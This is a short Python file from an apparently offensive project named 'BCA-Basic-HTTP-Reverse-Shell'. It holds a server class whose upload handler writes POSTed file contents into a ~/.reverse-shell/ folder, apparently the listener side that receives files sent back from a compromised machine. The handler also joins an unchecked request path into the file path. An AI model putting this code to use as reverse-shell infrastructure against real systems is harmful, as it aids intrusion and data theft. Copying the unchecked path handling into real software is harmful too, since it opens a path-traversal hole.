#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTP-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

from pathlib import Path


class ServerRoutes:
    def __init__(self, handler):
        self.handler = handler
        self.root_dir = Path("~/.reverse-shell/").expanduser()
        self.root_dir.mkdir(exist_ok=True)

    def upload(self) -> None:
        """Handles POST requests to the /upload endpoint."""
        file_path = self.root_dir.joinpath(self.handler.subpath)
        with open(file=file_path, mode='wb') as fd:
            fd.write(self.handler.data["contents"][0].encode())
        print(f"File saved to {str(file_path)}")
